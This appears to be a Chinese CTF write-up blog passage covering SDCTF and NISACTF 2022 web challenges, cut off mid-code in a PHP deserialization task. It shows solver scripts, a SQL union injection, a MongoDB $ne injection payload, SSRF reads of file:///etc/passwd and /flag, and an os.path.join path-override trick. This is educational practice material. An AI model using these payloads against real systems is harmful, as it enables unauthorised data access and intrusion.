<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157057.png" alt="image-20240718161513744"></p>
<h2 id="jawt-that-down">jawt that down!</h2>
<p>首先，信息搜集了一波，发现前端js文件泄露了账号和密码</p>
<pre><code class="hljs scss">}, r<span class="hljs-selector-class">.createElement</span>("span", {
                        className: "heading"
                    }, "Admin Sign In"), r<span class="hljs-selector-class">.createElement</span>("label", {
                        htmlFor: "username",
                        dangerouslySetInnerHTML: {
                            __html: "\x3c!-- REMOVE ME IN PUBLISHED SITE! Username: AzureDiamond --\x3eUsername"
                        }
                    }), r<span class="hljs-selector-class">.createElement</span>("input", {
                        type: "text",
                        id: "username",
                        name: "username"
                    }), r<span class="hljs-selector-class">.createElement</span>("label", {
                        htmlFor: "password",
                        dangerouslySetInnerHTML: {
                            __html: "\x3c!-- REMOVE ME IN PUBLISHED SITE! Password: hunter2 --\x3ePassword"
                        }</code></pre>
<p>接着按上面的账号登陆，发现页面多了一个N的超链接，不过访问的时候，显示找不到，过了几秒在访问，显示无效token，尝试点击这个超链接的时候抓包，如下图</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157058.png" alt="image-20240718165500515"></p>
<p>存在jwt，解密一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157059.png" alt="image-20240718165527424"></p>
<p>发现从签发时间到过期时间，只有2秒，但我们又破解不出来secret，同时复现的时候，题目感觉有点问题，没啥思路只能看wp，发现题目似乎的确有问题，当我点击N超链接的时候，url却是拼接的小写n，根据wp，我在登录之后迅速拼接大写N，得到下图回显</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157060.png" alt="image-20240718165453413"></p>
<p>这里做多了能想到利用python发包，不断登录不断回显，这里也有点脑洞，回显的字符，应该与上一个字符进行拼接形成目录：<code>/N/S</code>这样的形式</p>
<p>这样的话，写脚本思路也就清晰了。</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> requests

url = <span class="hljs-string">"http://node5.anna.nssctf.cn:25446/login"</span>
data = {<span class="hljs-string">"username"</span>: <span class="hljs-string">"AzureDiamond"</span>, <span class="hljs-string">"password"</span>: <span class="hljs-string">"hunter2"</span>}
sess = requests.session()
path = [<span class="hljs-string">'N'</span>, <span class="hljs-string">'S'</span>, <span class="hljs-string">'S'</span>]

sess.post(url=url, data=data)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():
    sess.post(url=url, data=data)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_dir</span>(<span class="hljs-params">path_s</span>):
    res = sess.get(url=<span class="hljs-string">'http://node5.anna.nssctf.cn:25446/{}'</span>.<span class="hljs-built_in">format</span>(path_s))
    <span class="hljs-keyword">return</span> res.text

<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    <span class="hljs-built_in">print</span>(path)
    path_s = <span class="hljs-string">'/'</span>.join(path)
    next_dir = get_dir(path_s)
    <span class="hljs-built_in">print</span>(next_dir)
    <span class="hljs-keyword">if</span> <span class="hljs-string">"Invalid Token: Access Denied"</span> == next_dir:
        login()
    <span class="hljs-keyword">elif</span> <span class="hljs-string">'End of message'</span> <span class="hljs-keyword">in</span> next_dir:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">''</span>.join(path))
        sys.exit(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">else</span>:
        path.append(next_dir)</code></pre>
<h2 id="lots-of-logs">lots of logs</h2>
<p>题目给了两个网址，第二个访问不了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157061.png" alt="image-20240718175931201"></p>
<p>访问第一个，发现里面除了能看到一些日志，其余也没啥信息了，看了wp发现，原来是观察url</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157062.png" alt="image-20240718180035863"></p>
<p>可以看到这里的目录很有结构规律，这里就可以尝试脚本自动化爬取其中的信息了</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2018</span>, <span class="hljs-number">2020</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">31</span>):
        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">31</span>):
            <span class="hljs-keyword">try</span>:
                date = datetime.date(i, j, k).strftime(<span class="hljs-string">"%a"</span>)
                url = <span class="hljs-string">f"http://node5.anna.nssctf.cn:27072/logs/<span class="hljs-subst">{i}</span>/<span class="hljs-subst">{j}</span>/<span class="hljs-subst">{k}</span>/<span class="hljs-subst">{date}</span>.log"</span>
                req = requests.get(url).text
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{i}</span>:<span class="hljs-subst">{j}</span>:<span class="hljs-subst">{k}</span>:<span class="hljs-subst">{date}</span>.log"</span>)
                <span class="hljs-keyword">if</span> <span class="hljs-string">"Cannot GET"</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> req:
                    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f"<span class="hljs-subst">{i}</span>-<span class="hljs-subst">{j}</span>-<span class="hljs-subst">{k}</span>-<span class="hljs-subst">{date}</span>.log"</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
                        f.write(req)
                        f.close()
            <span class="hljs-keyword">except</span> ValueError:
                <span class="hljs-keyword">pass</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157063.png" alt="image-20240718181708325"></p>
<p>也是马后炮，才得知，第二个网址是用来nc的，链接上去发现要提供密码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157064.png" alt="image-20240718181923960"></p>
<p>这道题考察的就是分析日志的能力了。。。，说实话，这么多日志，思路估计也就是找flag、nssctf之类的字眼，不过要是能知道第二个网址是要nc的，也就知道这里的找密码了。同时Linux命令熟悉的话，更简便了。。。</p>
<h2 id="gullible-by-dovesign">gullible by dovesign</h2>
<p>网站有文件上传的功能，同时也提示我们waf很强，然后我显示网上找了几个bird的图片，发现不能识别，于是我尝试下载本网站已经上传的图片，发现可以识别成功，经过对比和wp的提示。</p>
<p>可以看到这个waf是检测元数据内容的，如下图，如果元数据有鸟的名字就能正常识别了。随即也测试了可以上传php、asp等后缀，他没有检测，但是却不能知道文件路径，也无法猜测（wp的。。。）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157065.png" alt="image-20240718185309551"></p>
<p>随即尝试对图片名字测试，发现输入单引号，爆出sqlite错误，明显的sql注入了，网上找payload打</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157066.png" alt="image-20240718185828440"></p>
<p>上图可以确定含有三列，接下来找回显位：<code>1' union select 1,2,3--</code>确定回显位是2</p>
<p>然后找表明，如下图是三个，这里直觉选择employee</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157067.png" alt="image-20240718191357552"></p>
<p>最后在password中找到flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157068.png" alt="image-20240718191529497"></p>
<h2 id="humongous-mistake">HuMongous Mistake</h2>
<p>这道题目还得用到那个官方discord的服务器，由于我不知道咋找，索性只看个思路了。</p>
<p>这题的入手点是一个mongdb的nosql注入，参考文章如下：</p>
<p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/08/11/NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB/#0x03-NoSQL%E6%B3%A8%E5%85%A5">NoSQL注入</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#%E6%97%A7%E7%89%88%E5%86%99%E6%B3%95%E4%B8%80%E4%B8%8E%E6%96%B0%E7%89%88%E5%86%99%E6%B3%95%E4%B8%80">MongoDB 注入指北</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9908?time__1311=n4%2BxnD0DuDRDci730%3DD%2FiaRmrWd4DttQYtO4D#toc-10">Nosql 注入从零到一</a></p>
<p>用到的思路是PHP数组注入：</p>
<pre><code class="hljs scss">?username<span class="hljs-selector-attr">[$ne]</span>=<span class="hljs-number">1</span>&amp;password<span class="hljs-selector-attr">[$ne]</span>=<span class="hljs-number">1</span></code></pre>
<p>类似上述payload，那个网站在登陆的时候，存在admin用户，但是我们不知道密码。但却知道这是mongdb数据库，于是我们构造类似上述的payload，admin是已知的，那么重点关注password了。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157069.png" alt="image-20240718194834655"></p>
<p>最终再尝试下，猜测服务器只检查长度大小，于是向password添加了长度属性，成功绕过。后面似乎就是用户身份验证问题了。</p>
<p><a target="_blank" rel="noopener" href="https://sheeptester.github.io/longer-tweets/ctf/#mongodb-admin-ctf">sdctf 22 write-up</a></p>
<h1 id="nisactf-2022">[NISACTF 2022]</h1>
<h2 id="easyssrf">easyssrf</h2>
<p>根据页面提示，当使用file伪协议，发现回显明显不同，尝试file:///etc/passwd之后，回显：换个其他路径</p>
<p>然后尝试读取根目录的flag，发现如下图，让我们查看fl4g</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157070.png" alt="image-20240719161756786"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157071.png" alt="image-20240719161654867"></p>
<p>如上图，得到提示，访问之后代码如下</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);

<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">"file"</span>)){
  <span class="hljs-keyword">die</span>(<span class="hljs-string">"你败了."</span>);
}

<span class="hljs-comment">//flag in /flag</span>
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);</code></pre>
<p>如果file参数含有file字符，则无法正常读取文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157072.png" alt="image-20240719162001658"></p>
<p>尝试目录穿越，得到flag，不过伪协议也可以</p>
<h2 id="checkin">checkin</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">include</span> <span class="hljs-string">"flag.php"</span>;
<span class="hljs-comment">// ‮⁦NISACTF⁩⁦Welcome to</span>
<span class="hljs-keyword">if</span> (<span class="hljs-string">"jitanglailo"</span> == <span class="hljs-variable">$_GET</span>[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; <span class="hljs-string">"‮⁦ Flag!⁩⁦N1SACTF"</span> == <span class="hljs-variable">$_GET</span>[‮⁦Ugeiwo⁩⁦cuishiyuan]) { <span class="hljs-comment">//tnnd! weishenme b</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$FLAG</span>;
}
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>代码看着简单，但当你传参完之后，发现flag不能回显，接着我尝试鼠标复制这些参数值，发现光标不能正常跟着鼠标位置走。凭经验，直接cv全部，然后用vscode打开</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157073.png" alt="image-20240719164849162"></p>
<p>果然看到了特殊的unicode编码，最简单的办法：看wp学到的，直接F12查看源代码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157074.png" alt="image-20240719165330997"></p>
<p>找到正确位置，双击然后右键复制即可。随后复制完，直接放进上方url地址中，点击发送，之后会自动url编码，拿着编码后的结果，重新用hakbar发送，将其中的额外字符删掉。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157075.png" alt="image-20240719164714100"></p>
<h2 id="babyupload">babyupload</h2>
<p>没见过的考点：python中的os.path.join()处理文件上传绝对路径拼接漏洞</p>
<pre><code class="hljs scss">os<span class="hljs-selector-class">.path</span><span class="hljs-selector-class">.join</span>(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。
然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径os<span class="hljs-selector-class">.path</span><span class="hljs-selector-class">.join</span>(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。
然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</code></pre>
<p>题目给的关键代码如下</p>
<pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/upload'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():
    <span class="hljs-keyword">if</span> <span class="hljs-string">'file'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:
        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">'/'</span>)
    file = request.files[<span class="hljs-string">'file'</span>]
    <span class="hljs-keyword">if</span> <span class="hljs-string">"."</span> <span class="hljs-keyword">in</span> file.filename:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Bad filename!"</span>, <span class="hljs-number">403</span>
    conn = db()
    cur = conn.cursor()
    uid = uuid.uuid4().<span class="hljs-built_in">hex</span>
    <span class="hljs-keyword">try</span>:
        cur.execute(<span class="hljs-string">"insert into files (id, path) values (?, ?)"</span>, (uid, file.filename,))
    <span class="hljs-keyword">except</span> sqlite3.IntegrityError:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Duplicate file"</span>
    conn.commit()

    file.save(<span class="hljs-string">'uploads/'</span> + file.filename)
    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">'/file/'</span> + uid)


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/file/&lt;id&gt;'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">file</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):
    conn = db()
    cur = conn.cursor()
    cur.execute(<span class="hljs-string">"select path from files where id=?"</span>, (<span class="hljs-built_in">id</span>,))
    res = cur.fetchone()
    <span class="hljs-keyword">if</span> res <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">"File not found"</span>, <span class="hljs-number">404</span>

    <span class="hljs-comment"># print(res[0])</span>

    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(os.path.join(<span class="hljs-string">"uploads/"</span>, res[<span class="hljs-number">0</span>]), <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">return</span> f.read()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">80</span>)</code></pre>
<p>可以看到这里的os.path.join问题，如果我们传入的文件名是/flag，那之前的基础路径：uploads/就会被删除，直接从/flag开始</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157076.png" alt="image-20240719171859641"></p>
<p>如下图，成功读取flag</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407192157077.png" alt="image-20240719171638500"></p>
<h2 id="babyserialize">babyserialize</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">"waf.php"</span>;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NISA</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">"show_me_flag"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$txw4ever</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;fun==<span class="hljs-string">"show_me_flag"</span>){
            <span class="hljs-title function_ invoke__">hint</span>();
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$from</span>,<span class="hljs-variable">$val</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;fun=<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>];
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;fun;
        <span class="hljs-keyword">return</span> <span class="hljs-string">" "</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-title function_ invoke__">checkcheck</span>(<span class="hljs-variable">$this</span>-&gt;txw4ever);
        @<span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;txw4ever);
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TianXiWei</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ext</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;ext-&gt;<span class="hljs-title function_ invoke__">nisa</span>(<span class="hljs-variable">$this</span>-&gt;x);
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ilovetxw</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$huang</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$su</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun1</span>,<span class="hljs-variable">$arg</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;huang-&gt;fun=<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>];
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable">$bb</span> = <span class="hljs-variable language_">$this</span>-&gt;su;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$bb</span>();
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">four</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">"TXW4EVER"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$fun</span>=<span class="hljs-string">'abc'</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span>=<span class="hljs-variable">$value</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;fun = <span class="hljs-string">"sixsixsix"</span>){
            <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;a);
        }
    }
}

<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ser'</span>])){
    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ser'</span>]);
}<span class="hljs-keyword">else</span>{
